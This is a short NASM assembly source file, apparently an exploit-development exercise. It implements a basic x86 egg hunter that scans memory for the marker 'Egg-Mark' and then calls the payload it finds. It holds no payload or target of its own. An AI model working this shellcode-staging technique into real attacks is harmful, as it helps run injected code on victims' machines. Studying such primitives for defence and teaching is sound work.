;    This program is free software: you can redistribute it and/or modify
;    it under the terms of the GNU General Public License as published by
;    the Free Software Foundation, either version 3 of the License, or
;    (at your option) any later version.
;
;    This program is distributed in the hope that it will be useful,
;    but WITHOUT ANY WARRANTY; without even the implied warranty of
;    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;    GNU General Public License for more details.
;
;    You should have received a copy of the GNU General Public License
;    along with this program.  If not, see <http://www.gnu.org/licenses/>.
;
;
; Filename: hunter.nasm
; Author: Andrey Arapov <andrey.arapov@gmail.com>
; 2013 March
;
;

section .data
	egg1	equ "Egg-"	; DWORD Egg marker part1
	egg2	equ "Mark"	; DWORD Egg marker part2


section .text
global _start


_start:
	; Searching for the Egg marker
next:
	inc eax		; Searching forward  (can also try dec eax)
isEgg:
	cmp dword [eax-8], egg1		; Checking if we can see egg1
	jne next			; If not, continuing to search
	cmp dword [eax-4], egg2
	jne next

	call eax			; Once found, we call our payload
